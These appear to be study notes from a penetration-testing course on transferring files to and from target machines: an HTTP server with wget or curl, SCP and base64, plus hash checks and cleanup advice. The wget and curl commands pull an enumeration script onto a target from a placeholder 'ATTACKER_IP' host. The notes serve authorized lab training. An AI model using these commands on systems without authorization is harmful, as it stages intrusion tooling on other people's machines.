# Getting Started: Transferring Files

> Source: HTB Academy - Penetration Tester Path  
> Purpose: Organized source notes for authorized labs and assessments

## Why File Transfer Matters

Shell access often requires moving enumeration tools, approved proof-of-concept files, or collected evidence between the tester and a target. The transfer method depends on reachable protocols, available utilities, credentials, firewall rules, file size, and the rules of engagement.

## Python HTTP Server with `wget` or `curl`

From the directory containing the file, start a temporary server on the tester host:

```bash
python3 -m http.server 8000
```

Download from a Linux target:

```bash
wget http://ATTACKER_IP:8000/linenum.sh
```

If `wget` is unavailable:

```bash
curl http://ATTACKER_IP:8000/linenum.sh -o linenum.sh
```

The target must be able to reach the tester's selected interface and port. Stop the temporary server when it is no longer needed.

## SCP

When valid SSH credentials are available:

```bash
scp linenum.sh USER@TARGET:/tmp/linenum.sh
```

The local source comes before the remote `USER@HOST:/path` destination. SCP also supports downloading from the remote host by reversing the arguments.

## Base64 Transfer

For small files over a text-only channel, encode locally:

```bash
base64 FILE -w 0
```

Paste and decode remotely:

```bash
echo 'BASE64_DATA' | base64 -d > FILE
```

Base64 increases size and is easy to corrupt through truncation or copy/paste errors, so it is best suited to small payloads.

## Validation

Confirm the resulting type:

```bash
file FILE
```

Compare a strong checksum on both systems:

```bash
sha256sum FILE
```

Matching hashes demonstrate byte-for-byte integrity. File-type validation confirms that the result is consistent with the expected artifact.

## Method Selection

| Condition | Preferred method |
|---|---|
| Target can reach a temporary HTTP server | Python server with `wget` or `curl` |
| Valid SSH credentials exist | SCP |
| Only a text channel is available | Base64 for small files |
| Raw TCP is available and approved | Netcat transfer |

## Operational Safety

- Transfer only approved tooling and data.
- Use a controlled temporary directory where possible.
- Record source, destination, filename, hash, and timestamp.
- Verify architecture and file type before execution.
- Remove transferred tools and stop temporary listeners during cleanup.
- Do not move sensitive client data to unapproved systems.

## Promoted References

- [Unified File Transfer Knowledge](../../../../knowledge-base/exploitation/file-transfer.md)
- [File Transfer Cheat Sheet](../../../../cheatsheets/file-transfer.md)

> Use these techniques only in systems you own or have explicit authorization to test.
